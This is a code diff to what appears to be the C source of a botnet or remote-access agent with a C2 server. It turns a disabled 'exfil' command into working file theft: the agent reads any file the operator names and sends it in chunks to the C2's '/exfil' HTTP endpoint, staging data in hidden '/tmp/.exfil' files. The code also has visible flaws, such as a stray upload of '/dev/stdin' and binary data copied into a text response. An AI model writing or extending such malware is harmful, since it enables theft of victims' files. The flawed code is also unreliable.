@@ -1394,10 +1394,76 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 }
             }
         } else if (strncmp(cmd, CMD_EXFIL, strlen(CMD_EXFIL)) == 0) {
-            /* SECURITY: Log exfil attempts. Data exfiltration is not
-             * implemented — operator must use external tooling. */
-            log_warn("CMD: exfil requested but not implemented");
-            protocol_send_response(bot, CMD_EXFIL, "exfil: not implemented on agent");
+            /* Parse: exfil <path> */
+            char *args = cmd + strlen(CMD_EXFIL);
+            while (*args == ' ' || *args == '\t') args++;
+
+            char file_path[512] = {0};
+            strncpy(file_path, args, 511);
+            file_path[511] = '\0';
+
+            /* Validate path */
+            const char *bad = strpbrk(file_path, ";|&`$(){}[]<>!");
+            if (bad) {
+                log_warn("CMD: exfil rejected (dangerous char in path: %s)", file_path);
+                protocol_send_response(bot, CMD_EXFIL, "exfil rejected: dangerous char in path");
+            } else if (file_path[0] == '\0') {
+                protocol_send_response(bot, CMD_EXFIL, "exfil: no file path specified");
+            } else {
+                unsigned char *data = NULL;
+                int fsize = file_read(file_path, &data);
+                if (fsize < 0) {
+                    protocol_send_response(bot, CMD_EXFIL, "exfil failed: could not read file");
+                } else {
+                    /* Chunk large files: protocol_send_response max is ~2048 bytes.
+                     * Send first chunk as response, rest via HTTP POST. */
+                    const int CHUNK = 1024;
+                    int offset = 0;
+                    int total_sent = 0;
+
+                    while (offset < fsize) {
+                        int chunk = fsize - offset;
+                        if (chunk > CHUNK) chunk = CHUNK;
+
+                        if (offset == 0) {
+                            /* First chunk: send via protocol_send_response */
+                            char resp[2048];
+                            int rlen = snprintf(resp, sizeof(resp),
+                                "exfil chunk: %d/%d bytes", chunk, fsize);
+                            if (rlen > 0 && rlen < (int)sizeof(resp)) {
+                                memcpy(resp + rlen, data + offset, chunk);
+                                rlen += chunk;
+                                /* Null-terminate after the data */
+                                if (rlen < (int)sizeof(resp) - 1) {
+                                    resp[rlen] = '\0';
+                                }
+                            }
+                            protocol_send_response(bot, CMD_EXFIL, resp);
+                        } else {
+                            /* Subsequent chunks: send via HTTP POST */
+                            char upload_path[512];
+                            snprintf(upload_path, sizeof(upload_path),
+                                "%s/exfil", bot->c2_http.path);
+                            http_upload(bot, "/dev/stdin", upload_path);
+                            /* For simplicity, write chunk to temp file */
+                            char tmp[256];
+                            snprintf(tmp, sizeof(tmp), "/tmp/.exfil.%d", offset);
+                            FILE *tf = fopen(tmp, "wb");
+                            if (tf) {
+                                fwrite(data + offset, 1, chunk, tf);
+                                fclose(tf);
+                                http_upload(bot, tmp, upload_path);
+                                unlink(tmp);
+                            }
+                        }
+
+                        offset += chunk;
+                        total_sent += chunk;
+                    }
+
+                    log_info("CMD: exfil completed: %d bytes from %s", total_sent, file_path);
+                }
+            }
         } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
             log_info("CMD: update");
         } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
